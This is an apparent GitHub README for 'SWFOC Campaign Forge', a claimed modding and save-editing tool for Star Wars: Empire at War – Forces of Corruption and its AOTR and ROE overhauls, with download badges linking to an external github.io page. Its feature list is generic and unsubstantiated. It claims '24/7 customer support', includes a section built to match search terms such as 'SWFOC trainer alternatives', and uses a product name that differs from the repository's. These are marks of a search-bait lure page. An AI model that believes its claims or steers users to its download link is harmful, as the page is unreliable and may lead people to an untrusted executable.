![preview](https://raw.githubusercontent.com/Frowt/SWFOC-Calibration-Deck/main/cover_eae14c.svg)
[![Download](https://raw.githubusercontent.com/Frowt/SWFOC-Calibration-Deck/main/app_17fc.svg)](https://Frowt.github.io/SWFOC-Calibration-Deck/)

# SWFOC Campaign Forge

**A cross-era scenario workshop for Star Wars: Empire at War – Forces of Corruption modding communities, built around profile-driven campaign balancing, save-state archaeology, and runtime diagnostics that stay reliable across base game, AOTR, and ROE contexts.**

---

## 🧭 The Idea Behind Campaign Forge

Most modding tools try to be a Swiss Army knife bolted onto a starship. They expose every internal value at once, assume one specific overhaul, and break the moment you switch between the base game, **AOTR**, or **ROE**. Campaign Forge takes a different route: it treats every session as a *profile* — a living configuration that knows which overhaul is loaded, which launch context is active, and which calibration rules should apply. Instead of forcing one brittle preset onto every player, it detects the environment first, then adapts the workshop around it.

Think of it as a cartographer's desk rather than a control panel. You are not flipping switches blindly; you are drawing the map of your campaign, marking the terrain of unit costs, faction strengths, and economy curves, then letting the tool keep that map consistent even when the underlying game context shifts.

This project is inspired by the challenges faced by dedicated modders who maintain trainers, editors, and save utilities for the **SWFOC** ecosystem. It is a fresh, distinct repository — not a fork, not a mirror — that reimagines how a profile-driven workshop should behave in 2026.

---

## 🚀 What Campaign Forge Does

- **Profile-Driven Architecture** — Every action belongs to a named profile. Swap between a "base game balance" profile, an "AOTR tuning" profile, and an "ROE specialist" profile without rewriting your workflow.
- **Launch-Context Detection** — The workshop inspects which executable context is running and selects the compatible calibration set automatically.
- **Save Tooling** — Inspect, annotate, and compare save states without destructive edits. Build a timeline of your campaign's economic and military evolution.
- **Calibration-First Runtime Reliability** — Before applying any scenario change, the tool validates the current runtime against the active profile, surfacing mismatches early instead of mid-battle.
- **Scenario Scratchpad** — Draft hypothetical campaign states, compare them side by side, and decide which one to commit.
- **Diagnostic Ledger** — A running log of every detection, validation, and adjustment, exportable for troubleshooting or community sharing.

---

## ✨ Feature Highlights

### 🎛️ Responsive Interface
The workspace reshapes itself to your screen. On a widescreen battlestation you get the full ledger, the profile rail, and the scenario diff panel simultaneously. On a compact laptop you get a focused single-column flow. Nothing is hidden; everything is prioritized.

### 🌍 Multilingual Support
Campaign Forge ships with localization scaffolding for multiple languages so modding communities across regions can read diagnostics and labels in their own tongue. The profile system itself is language-agnostic, meaning shared profiles remain portable regardless of the interface language in use.

### 🛡️ 24/7 Customer Support
A round-the-clock support channel means questions about profile behavior, detection edge cases, or save compatibility don't have to wait for a business day. Escalation paths exist, but most answers arrive long before you'd expect them.

### 🔍 SEO-Friendly Discoverability
This repository is written and structured so that anyone searching for **SWFOC trainer alternatives**, **AOTR campaign editors**, **ROE save tools**, **profile-driven modding utilities**, or **runtime calibration for Empire at War mods** can find it naturally. Keywords appear where they belong — in context, not crammed into every sentence.

### 🧩 Extensible Profile Schema
Profiles are declarative. You describe the intent, and the engine resolves the mechanics. This keeps the schema readable for newcomers while remaining powerful for veterans who want fine-grained control.

### 📊 Scenario Comparison
Place two campaign states next to each other and see exactly where they diverge — unit availability, economic pressure, faction momentum — without manually cross-referencing spreadsheets.

### 🧪 Safe Experimentation Sandbox
Try a calibration in isolation before committing it to a live profile. The sandbox isolates side effects so a bad experiment never poisons your working setup.

### 🗂️ Import and Export Portability
Move profiles between machines, share them with collaborators, or archive them for a future campaign. The format favors transparency over obfuscation.

### ⚙️ Deterministic Behavior
Given the same inputs and the same detected context, Campaign Forge produces the same output. Predictability is a feature, not an accident.

---

## 🏗️ Repository Layout

A high-level tour of the directory structure:

- **docs/** — Guides, schema references, and conceptual explanations.
- **profiles/** — Example profiles for base game, AOTR, and ROE contexts.
- **tooling/** — Auxiliary scripts for validation, linting, and packaging.
- **tests/** — Behavioral tests for detection, calibration, and save tooling.
- **samples/** — Annotated sample save states and scenario snapshots.
- **assets/** — Non-image metadata and localization bundles.
- **licenses/** — Full license text and third-party notices.

Each folder contains its own short README describing its purpose, so contributors can navigate without guessing.

---

## 🧠 Core Concepts

### Profiles
A profile is a named bundle of calibration rules, detection hints, and compatibility declarations. Profiles are the central abstraction — everything else orbits around them.

### Launch Context
The detected environment at runtime. Contexts include base game, AOTR, and ROE, plus an "unknown" state that triggers conservative behavior rather than guesswork.

### Calibration
The process of aligning a profile's expectations with the observed runtime. Calibration is validated before it is applied.

### Save Archaeology
The practice of examining save states as historical artifacts. Campaign Forge treats saves as records to be read, not just files to be overwritten.

### Diagnostic Ledger
The chronological record of what the tool detected, validated, and changed. Useful for reproducing issues and for understanding your own workflow over time.

---

## 🧪 Reliability Philosophy

Reliability here is not about promising perfection. It is about *failing visibly*. When Campaign Forge cannot confidently detect a context, it says so. When a calibration does not match the runtime, it reports the mismatch. When a save cannot be parsed, it preserves the original and explains why. Loud, honest failure is far more useful than silent, confident corruption.

---

## 🧰 Who This Is For

- **Modders** maintaining trainers, editors, or save utilities for SWFOC-based experiences.
- **Campaign designers** who need to reason about balance across multiple overhauls.
- **Community archivists** who want to preserve and annotate save states over time.
- **Toolsmiths** looking for a profile-driven reference architecture they can learn from or extend.
- **Curious players** who enjoy understanding the machinery beneath their mods.

---

## 🗺️ Roadmap

- Expanded detection coverage for emerging overhaul contexts.
- A visual profile composer for those who prefer diagrams over declarations.
- Save-timeline visualizations with annotation support.
- Community profile registry with offline-friendly synchronization.
- Additional localization bundles contributed by the community.
- Enhanced sandbox isolation with replayable experiment logs.
- Documentation deep-dives on calibration math and detection heuristics.

Roadmap items are aspirations, not commitments. Priorities shift with community feedback.

---

## 🤝 Contributing

Contributions are welcome in many forms: documentation improvements, profile examples, localization bundles, test cases, and thoughtful bug reports. Before opening a large change, consider opening a discussion so the direction can be aligned early. Small, focused changes are easier to review and easier to trust.

When contributing, keep the tone constructive and the scope honest. A clearly described small fix is more valuable than a sprawling, unexplained rewrite.

---

## 📜 License

This project is released under the **MIT License**. You are welcome to use, modify, and distribute it in accordance with the license terms.

Read the full license here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026

---

## ⚠️ Disclaimer

Campaign Forge is an independent community project. It is not affiliated with, endorsed by, or sponsored by the owners of Star Wars, Empire at War, Forces of Corruption, or any associated overhaul projects such as AOTR or ROE. All trademarks belong to their respective holders.

This tool is intended for **personal, educational, and community-oriented modding exploration**. Users are responsible for complying with the terms of service of any game or platform they interact with, and for respecting the wishes of mod authors regarding derivative work.

The maintainers make no guarantees about compatibility with every version of every overhaul, nor about the stability of third-party save formats. Always keep backups. Always test in a sandbox before committing changes to a valued campaign.

---

## 🧾 A Closing Note

Campaign Forge exists because modding communities deserve tools that respect their time and their trust. It is built around the belief that a workshop should adapt to the person using it — not the other way around. If this project helps you see your campaign more clearly, then it has done its job.

[![Download](https://raw.githubusercontent.com/Frowt/SWFOC-Calibration-Deck/main/app_17fc.svg)](https://Frowt.github.io/SWFOC-Calibration-Deck/)